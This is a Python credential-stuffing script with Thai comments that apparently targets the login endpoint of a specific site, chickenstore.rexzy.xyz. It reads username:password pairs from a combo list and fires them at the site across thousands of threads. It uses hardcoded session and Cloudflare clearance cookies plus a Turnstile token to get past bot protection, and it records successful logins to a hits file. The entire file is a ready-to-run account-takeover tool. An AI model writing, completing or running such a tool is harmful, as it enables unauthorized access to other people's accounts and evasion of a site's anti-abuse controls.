import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- ตั้งค่าไฟล์และ Threads ---
INPUT_FILE = "msd.txt"
OUTPUT_FILE = "hits.txt"
THREADS = 5737  # แนะนำให้ลดลงจาก 5000 เพราะ Server อาจบล็อก IP ได้

file_lock = threading.Lock()

# ส่วนของ Header ที่จำเป็น (ดึงมาจากที่คุณให้มา)
HEADERS_BASE = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'sec-ch-ua-platform': '"Android"',
    'x-requested-with': "XMLHttpRequest",
    'origin': "https://chickenstore.rexzy.xyz",
    'referer': "https://chickenstore.rexzy.xyz/login",
    'accept-language': "th,en;q=0.9",
    # หมายเหตุ: Cookie อาจจะหมดอายุ ต้องเปลี่ยนใหม่เป็นระยะ
    'Cookie': "PHPSESSID=5lqhv5lkc6nangkusk73g7k8s1; cf_clearance=ZUnxM1YygBhj1pAuXRUEOGGkKKD2JWWRe4428HXOIsI-1774343964-1.2.1.1-Db4ZJkj8GT5x5t.ADzW5UxZpQBSLJIHxAuiLwB460NBnbESV0cH0xAaYIBdk2al9I8Zci5q3iJj.4EIWtTLyI25g9eIGB6LGAJBKgcOParbdjAnqTUojv1DX2zLBiaGmFLTSZGHqyONS6hQYTIY9B7VWTyeYEX1491gmgDlLiw60i8uygg1MF3S0CpYCIX2FZ9LD1gDd4lH2H2ibfYtME3hROhNezumQCebWxcpk0HE"
}

def login_and_check(username, password):
    url = "https://chickenstore.rexzy.xyz/services/login.php"
    
    # คำเตือน: cf-turnstile มักจะใช้ซ้ำไม่ได้ ถ้าติด Error ให้อ่านด้านล่าง
    payload = {
        'username': username,
        'password': password,
        'login_remember': 'true',
        'cf-turnstile': '0.uPqsgBjLsk_...' # ใส่ค่าเต็มที่คุณมี
    }

    try:
        # ใช้ session เพื่อรักษา cookie ระหว่าง request (ถ้าจำเป็น)
        resp = requests.post(url, data=payload, headers=HEADERS_BASE, timeout=15)
        
        # ตรวจสอบการตอบกลับ (สมมติว่าสำเร็จถ้ามีข้อความบางอย่าง หรือ redirect)
        # คุณต้องเช็ค response.text จริงๆ ว่าถ้าผ่าน/ไม่ผ่าน เว็บส่งอะไรมา
        response_text = resp.text
        
        if '"success"' in response_text or "เข้าสู่ระบบสำเร็จ" in response_text:
            return True, response_text
        else:
            return False, response_text
    except Exception as e:
        return None, str(e)

def save_hit(line):
    with file_lock:
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
            f.flush()

def check_account(combo):
    combo = combo.strip()
    if not combo or ":" not in combo:
        return

    parts = combo.split(":", 1)
    username = parts[0].strip()
    password = parts[1].strip()

    success, message = login_and_check(username, password)

    if success:
        result = (
            f"{'='*30}\n"
            f"USER: {username}\n"
            f"PASS: {password}\n"
            f"INFO: {message}\n"
            f"{'='*30}"
        )
        save_hit(result)
        print(f"[HIT] {username} - Login Success!")
    elif success is False:
        print(f"[MISS] {username}")
    else:
        print(f"[ERR] {username} - {message}")

def main():
    try:
        with open(INPUT_FILE, "r", encoding="utf-8") as f:
            combos = f.readlines()
    except FileNotFoundError:
        print(f"[ERROR] ไม่พบไฟล์ {INPUT_FILE}")
        return

    combos = [c for c in combos if c.strip() and ":" in c]
    print(f"[INFO] เริ่มตรวจสอบ {len(combos)} รายการ...")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(check_account, c) for c in combos]
        for future in as_completed(futures):
            pass

    print(f"\n[DONE] ตรวจสอบเสร็จสิ้น ผลลัพธ์อยู่ที่ {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
